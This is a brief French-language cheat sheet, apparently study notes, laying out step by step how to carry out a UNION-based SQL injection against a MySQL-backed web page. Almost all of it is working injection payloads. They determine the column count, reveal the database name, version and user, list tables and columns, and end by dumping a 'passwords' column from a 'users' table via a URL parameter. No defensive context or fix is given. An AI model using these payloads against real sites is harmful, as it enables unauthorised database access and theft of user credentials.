## Cas d'une SQL injection UNION attacks sur MySQL
*L'objectif est de résumer les étapes d'une SQLi UNION en simplifiant le plus possible*

### 1. Nombre de colonne
' ORDER by 1
' UNION SELECT NULL,NULL,NULL
' UNION SELECT 1,2,3

### 2. Nom de la base de données
' UNION SELECT 1,2,database()

### 3. Version de la base de données
' UNION SELECT 1,2,version()

### 4. User de la base de données
' UNION SELECT 1,2,user()

### 5. Nom des tables
https://exemple.com/test.php?param=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()

### 6. Nom des colonnes dans une table (ex : table "users")
https://exemple.com/test.php?param=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'

### 7. On selectionne les colonnes qui nous intéressent (ex: colonne "passwords")
https://exemple.com/test.php?param=1' union select 1,2,group_concat(passwords) from users

### En résumé : 
1. Nombre de colonne
2. On teste quelles colonnes nous retournent des chaînes de caratères (string datas)
3. Nom, version et user de la base de données
4. Nom des tables
5. Noms des colonnes
6. ontenue des colonnes
